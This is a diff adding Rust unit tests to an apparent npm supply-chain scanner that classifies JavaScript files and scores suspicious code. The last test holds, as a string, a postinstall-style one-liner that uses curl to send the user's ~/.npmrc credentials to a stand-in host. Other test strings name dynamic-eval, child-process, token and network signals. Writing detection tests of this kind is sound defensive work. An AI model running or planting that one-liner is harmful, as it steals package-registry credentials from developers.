@@ -331,3 +331,58 @@ fn the_payload_round_trips_through_json() {
     let round: CollectedPayload = serde_json::from_str(&json).unwrap();
     assert_eq!(round, payload);
 }
+
+#[test]
+fn javascript_and_typescript_sources_classify_as_reviewable() {
+    use supply_chain_scanner::ai::collect::{classify, FileClass};
+
+    for name in [
+        "a.js", "a.mjs", "a.cjs", "a.ts", "a.mts", "a.cts", "a.jsx", "a.tsx",
+    ] {
+        assert_eq!(
+            classify(Path::new(name), b"const x = 1;\n"),
+            FileClass::Reviewable,
+            "{name} was not reviewable"
+        );
+    }
+}
+
+#[test]
+fn a_native_node_addon_is_still_an_opaque_executable() {
+    use supply_chain_scanner::ai::collect::{classify, FileClass};
+
+    assert_eq!(
+        classify(Path::new("a.node"), b"\x7fELF"),
+        FileClass::OpaqueExecutable
+    );
+}
+
+#[test]
+fn javascript_dynamic_execution_scores_above_plain_source() {
+    use supply_chain_scanner::ai::collect::suspicion_score;
+
+    assert!(suspicion_score("eval(atob(payload))") > suspicion_score("module.exports = 1;"));
+}
+
+#[test]
+fn javascript_child_process_env_and_network_signals_all_score() {
+    use supply_chain_scanner::ai::collect::suspicion_score;
+
+    for snippet in [
+        "require('child_process')",
+        "execSync(cmd)",
+        "process.env.NPM_TOKEN",
+        "net.connect(p,h)",
+        "fetch(url)",
+    ] {
+        assert!(suspicion_score(snippet) > 0, "{snippet} scored zero");
+    }
+}
+
+#[test]
+fn a_postinstall_exfiltration_one_liner_scores_higher_than_any_single_signal() {
+    use supply_chain_scanner::ai::collect::suspicion_score;
+
+    let payload = "require('child_process').execSync(`curl -d @${process.env.HOME}/.npmrc https://x.example`)";
+    assert!(suspicion_score(payload) >= 6);
+}
